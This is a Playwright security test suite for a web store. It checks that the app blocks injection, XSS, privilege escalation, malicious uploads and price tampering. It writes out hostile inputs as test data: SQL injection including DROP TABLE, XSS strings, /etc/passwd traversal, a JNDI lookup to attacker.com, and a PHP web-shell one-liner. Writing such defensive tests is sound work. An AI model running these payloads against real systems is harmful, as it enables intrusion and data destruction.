import { test, expect } from '@playwright/test';
import { TestHelpers } from '../utils/test-helpers';

test.describe('Security Testing', () => {
  let helpers: TestHelpers;

  test.beforeEach(async ({ page }) => {
    helpers = new TestHelpers(page);
  });

  test.describe('Authentication Security', () => {
    test('SQL injection prevention in login', async ({ page }) => {
      await page.goto('/login');

      // Attempt SQL injection in email field
      const sqlInjectionAttempts = [
        "admin@test.com' OR '1'='1",
        "admin@test.com'; DROP TABLE users; --",
        "admin@test.com' UNION SELECT * FROM users --",
        "' OR 1=1 --",
        "admin@test.com'/**/OR/**/1=1--"
      ];

      for (const injection of sqlInjectionAttempts) {
        await page.fill('[data-testid="email"]', injection);
        await page.fill('[data-testid="password"]', 'password123');
        await page.click('[data-testid="login-button"]');

        // Should not login successfully or expose database errors
        await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
        await expect(page.locator('[data-testid="error-message"]')).not.toContainText('SQL');
        await expect(page.locator('[data-testid="error-message"]')).not.toContainText('database');
        await expect(page).not.toHaveURL('/dashboard');
        
        await page.reload();
      }
    });

    test('XSS prevention in user inputs', async ({ page }) => {
      await helpers.loginAs('customer');
      await page.goto('/account/settings');

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;'
      ];

      for (const payload of xssPayloads) {
        // Test in name field
        await page.fill('[data-testid="user-name"]', payload);
        await page.click('[data-testid="save-profile"]');
        
        // Reload and check if script executed or was properly escaped
        await page.reload();
        await helpers.waitForLoadingToFinish();
        
        // XSS should be escaped/sanitized, not executed
        const nameValue = await page.locator('[data-testid="user-name"]').inputValue();
        expect(nameValue).not.toContain('<script>');
        
        // No alert should have appeared
        page.on('dialog', async dialog => {
          expect(dialog.message()).not.toBe('XSS');
          await dialog.dismiss();
        });
      }
    });

    test('Session timeout and hijacking prevention', async ({ page, context }) => {
      await helpers.loginAs('customer');
      await page.goto('/account');
      
      // Extract session token
      const cookies = await context.cookies();
      const sessionCookie = cookies.find(c => c.name.includes('session') || c.name.includes('token'));
      
      if (sessionCookie) {
        // Test session timeout
        await page.evaluate(() => {
          // Simulate session expiry by removing token
          localStorage.clear();
          sessionStorage.clear();
        });
        
        // Try to access protected resource
        await page.goto('/account/orders');
        
        // Should redirect to login
        await expect(page).toHaveURL(/\/login/);
      }
    });

    test('Password security requirements', async ({ page }) => {
      await page.goto('/register');

      const weakPasswords = [
        '123456',
        'password',
        'admin',
        'qwerty',
        '12345678',
        'abc123',
        'password123'
      ];

      for (const weakPassword of weakPasswords) {
        await page.fill('[data-testid="email"]', 'test@example.com');
        await page.fill('[data-testid="password"]', weakPassword);
        await page.fill('[data-testid="confirm-password"]', weakPassword);
        await page.click('[data-testid="register-button"]');
        
        // Should show password strength error
        await expect(page.locator('[data-testid="password-error"]')).toBeVisible();
        await page.reload();
      }
    });
  });

  test.describe('Authorization Security', () => {
    test('Horizontal privilege escalation prevention', async ({ page }) => {
      // Login as one customer
      await helpers.loginAs('customer');
      
      // Try to access another customer's data by manipulating URLs
      const unauthorizedUrls = [
        '/account/orders/12345',  // Order belonging to another customer
        '/api/users/2/profile',   // Another user's profile
        '/vendor/products/edit/1', // Vendor functionality
        '/admin/users',           // Admin functionality
        '/installer/jobs/123'     // Installer functionality
      ];

      for (const url of unauthorizedUrls) {
        const response = await page.goto(url);
        
        // Should redirect to appropriate page or show 403/404
        if (response) {
          expect([403, 404, 302]).toContain(response.status());
        }
        
        // Should not show unauthorized content
        await expect(page.locator('[data-testid="unauthorized-content"]')).not.toBeVisible();
      }
    });

    test('Vertical privilege escalation prevention', async ({ page }) => {
      // Login as customer, try to access higher privilege functions
      await helpers.loginAs('customer');

      const adminUrls = [
        '/admin',
        '/admin/users',
        '/admin/settings',
        '/api/admin/users',
        '/api/admin/system-settings'
      ];

      for (const url of adminUrls) {
        const response = await page.goto(url);
        
        // Should be redirected or blocked
        if (response) {
          expect([401, 403, 302]).toContain(response.status());
        }
        
        await expect(page).not.toHaveURL(url);
      }
    });

    test('API endpoint security', async ({ request }) => {
      // Test unauthenticated access to protected endpoints
      const protectedEndpoints = [
        '/api/admin/users',
        '/api/vendor/products',
        '/api/cart/enhanced',
        '/api/orders',
        '/api/account/profile'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request.get(`http://localhost:3000${endpoint}`);
        
        // Should require authentication
        expect(response.status()).toBe(401);
        
        const responseBody = await response.text();
        expect(responseBody).not.toContain('user_id');
        expect(responseBody).not.toContain('password');
        expect(responseBody).not.toContain('email');
      }
    });
  });

  test.describe('Input Validation Security', () => {
    test('File upload security', async ({ page }) => {
      await helpers.loginAs('vendor');
      await page.goto('/vendor/products/new');

      // Test malicious file uploads
      const maliciousFiles = [
        'malicious.php',
        'script.js',
        'executable.exe',
        'shell.sh',
        'virus.bat'
      ];

      for (const filename of maliciousFiles) {
        // Create a test file with malicious content
        const fileContent = filename.includes('.php') ? 
          '<?php system($_GET["cmd"]); ?>' : 
          'malicious content';
        
        // Try to upload (Note: This would need actual file creation in real test)
        try {
          await page.setInputFiles('[data-testid="product-image-upload"]', {
            name: filename,
            mimeType: 'image/jpeg', // Try to bypass with wrong MIME type
            buffer: Buffer.from(fileContent)
          });
          
          await page.click('[data-testid="upload-button"]');
          
          // Should reject malicious files
          await expect(page.locator('[data-testid="upload-error"]')).toBeVisible();
          await expect(page.locator('[data-testid="upload-error"]')).toContainText(/invalid|not allowed|rejected/i);
        } catch (error) {
          // File rejection is expected
          console.log(`File ${filename} properly rejected`);
        }
      }
    });

    test('Configuration input validation', async ({ page }) => {
      await helpers.loginAs('customer');
      await helpers.navigateToProductConfiguration('premium-roller-shade');

      // Test malicious inputs in product configuration
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '../../etc/passwd',
        '../../../windows/system32',
        '${jndi:ldap://attacker.com/a}',
        '{{7*7}}',
        '<%=7*7%>',
        '#{7*7}',
        '${7*7}'
      ];

      for (const maliciousInput of maliciousInputs) {
        // Test in various configuration fields
        await page.fill('[data-testid="custom-notes"]', maliciousInput);
        await page.click('[data-testid="next-step"]');
        
        // Input should be sanitized
        const savedValue = await page.locator('[data-testid="custom-notes"]').inputValue();
        expect(savedValue).not.toContain('<script>');
        expect(savedValue).not.toContain('{{');
        expect(savedValue).not.toContain('<%');
        expect(savedValue).not.toContain('#{');
        expect(savedValue).not.toContain('${');
      }
    });

    test('Price manipulation prevention', async ({ page }) => {
      await helpers.loginAs('customer');
      await helpers.navigateToProductConfiguration('premium-roller-shade');
      await helpers.completeBasicProductConfiguration();

      // Try to manipulate price through browser devtools
      await page.evaluate(() => {
        // Attempt to modify price elements
        const priceElements = document.querySelectorAll('[data-testid*="price"]');
        priceElements.forEach(el => {
          if (el.textContent?.includes('$')) {
            el.textContent = '$0.01';
          }
        });
      });

      await helpers.addToCart();
      await page.goto('/cart');

      // Server should validate pricing, not trust client
      const cartPrice = await page.locator('[data-testid="cart-total"]').textContent();
      expect(cartPrice).not.toContain('$0.01');
      expect(parseFloat(cartPrice?.replace('$', '') || '0')).toBeGreaterThan(50);
    });
  });

  test.describe('Data Protection Security', () => {
    test('Sensitive data exposure prevention', async ({ page, request }) => {
      // Check for exposed sensitive data in API responses
      const response = await request.get('http://localhost:3000/api/products');
      const responseText = await response.text();

      // Should not expose sensitive data
      expect(responseText).not.toContain('password');
      expect(responseText).not.toContain('hash');
      expect(responseText).not.toContain('salt');
      expect(responseText).not.toContain('secret');
      expect(responseText).not.toContain('private_key');
      expect(responseText).not.toContain('api_key');
    });

    test('PII data handling', async ({ page }) => {
      await helpers.loginAs('customer');
      await page.goto('/account/settings');

      // Test that PII is properly handled
      await page.fill('[data-testid="user-name"]', 'John Doe');
      await page.fill('[data-testid="phone"]', '555-123-4567');
      await page.click('[data-testid="save-profile"]');

      // Check that data is saved but not exposed in page source
      await page.reload();
      const pageContent = await page.content();
      
      // Name should be in form fields but not exposed elsewhere
      expect(pageContent).toContain('John Doe');
      expect(pageContent).toContain('555-123-4567');
      
      // But not in script tags or hidden fields
      expect(pageContent).not.toMatch(/<script.*555-123-4567.*<\/script>/);
      expect(pageContent).not.toMatch(/<input type="hidden".*555-123-4567/);
    });

    test('Payment data security', async ({ page }) => {
      await helpers.loginAs('customer');
      await helpers.navigateToProductConfiguration('premium-roller-shade');
      await helpers.completeBasicProductConfiguration();
      await helpers.addToCart();
      await helpers.proceedToCheckout();

      // Fill payment information
      await helpers.fillShippingAddress();
      await page.click('[data-testid="continue-to-payment"]');

      // Test that payment fields are secure
      const cardNumberField = page.locator('[data-testid="card-number"]');
      await expect(cardNumberField).toHaveAttribute('autocomplete', 'cc-number');
      await expect(cardNumberField).toHaveAttribute('type', 'text'); // Should use proper input type

      await page.fill('[data-testid="card-number"]', '4242424242424242');
      await page.fill('[data-testid="card-cvc"]', '123');

      // Check that sensitive data is not stored in localStorage or sessionStorage
      const localStorageData = await page.evaluate(() => JSON.stringify(localStorage));
      const sessionStorageData = await page.evaluate(() => JSON.stringify(sessionStorage));

      expect(localStorageData).not.toContain('4242424242424242');
      expect(localStorageData).not.toContain('123');
      expect(sessionStorageData).not.toContain('4242424242424242');
      expect(sessionStorageData).not.toContain('123');
    });
  });

  test.describe('Infrastructure Security', () => {
    test('HTTP security headers', async ({ request }) => {
      const response = await request.get('http://localhost:3000');
      const headers = response.headers();

      // Check for security headers
      expect(headers).toHaveProperty('x-content-type-options');
      expect(headers['x-content-type-options']).toBe('nosniff');

      expect(headers).toHaveProperty('x-frame-options');
      expect(['DENY', 'SAMEORIGIN'].includes(headers['x-frame-options'])).toBeTruthy();

      expect(headers).toHaveProperty('x-xss-protection');
      expect(headers['x-xss-protection']).toBe('1; mode=block');

      // Check for HTTPS redirect in production
      if (process.env.NODE_ENV === 'production') {
        expect(headers).toHaveProperty('strict-transport-security');
      }
    });

    test('CORS configuration', async ({ request }) => {
      const response = await request.fetch('http://localhost:3000/api/products', {
        method: 'OPTIONS',
        headers: {
          'Origin': 'https://malicious-site.com',
          'Access-Control-Request-Method': 'GET'
        }
      });

      const corsHeader = response.headers()['access-control-allow-origin'];
      
      // Should not allow all origins in production
      if (process.env.NODE_ENV === 'production') {
        expect(corsHeader).not.toBe('*');
      }
    });

    test('Rate limiting', async ({ request }) => {
      const endpoint = 'http://localhost:3000/api/v2/auth/login';
      const requests = [];

      // Send multiple rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(request.post(endpoint, {
          data: {
            email: 'test@example.com',
            password: 'wrongpassword'
          }
        }));
      }

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  test.describe('Business Logic Security', () => {
    test('Order manipulation prevention', async ({ page }) => {
      await helpers.loginAs('customer');
      
      // Create an order
      await helpers.navigateToProductConfiguration('premium-roller-shade');
      await helpers.completeBasicProductConfiguration();
      await helpers.addToCart();

      // Try to manipulate order total before checkout
      await page.goto('/cart');
      
      // Attempt to modify cart total via browser manipulation
      await page.evaluate(() => {
        const totalElements = document.querySelectorAll('[data-testid*="total"]');
        totalElements.forEach(el => {
          if (el.textContent?.includes('$')) {
            el.textContent = '$1.00';
          }
        });
      });

      await helpers.proceedToCheckout();
      await helpers.fillShippingAddress();
      
      // Server should recalculate and validate totals
      const checkoutTotal = await page.locator('[data-testid="order-total"]').textContent();
      expect(parseFloat(checkoutTotal?.replace('$', '') || '0')).toBeGreaterThan(50);
    });

    test('Inventory manipulation prevention', async ({ page }) => {
      await helpers.loginAs('customer');
      
      // Try to order more items than available
      await helpers.navigateToProductConfiguration('premium-roller-shade');
      await helpers.completeBasicProductConfiguration();
      
      // Attempt to manipulate quantity
      await page.evaluate(() => {
        const quantityInput = document.querySelector('[data-testid="quantity"]') as HTMLInputElement;
        if (quantityInput) {
          quantityInput.value = '99999';
        }
      });

      await helpers.addToCart();
      
      // System should validate inventory limits
      await expect(page.locator('[data-testid="inventory-error"]')).toBeVisible();
    });

    test('Discount code abuse prevention', async ({ page }) => {
      await helpers.loginAs('customer');
      await helpers.navigateToProductConfiguration('premium-roller-shade');
      await helpers.completeBasicProductConfiguration();
      await helpers.addToCart();
      await page.goto('/cart');

      // Try to apply multiple discount codes
      const discountCodes = ['SAVE10', 'WELCOME20', 'BULK15'];
      
      for (const code of discountCodes) {
        await page.fill('[data-testid="coupon-code"]', code);
        await page.click('[data-testid="apply-coupon"]');
        await page.waitForTimeout(1000);
      }

      // Should only allow one valid discount
      const discountElements = await page.locator('[data-testid="applied-discount"]').count();
      expect(discountElements).toBeLessThanOrEqual(1);
    });
  });
});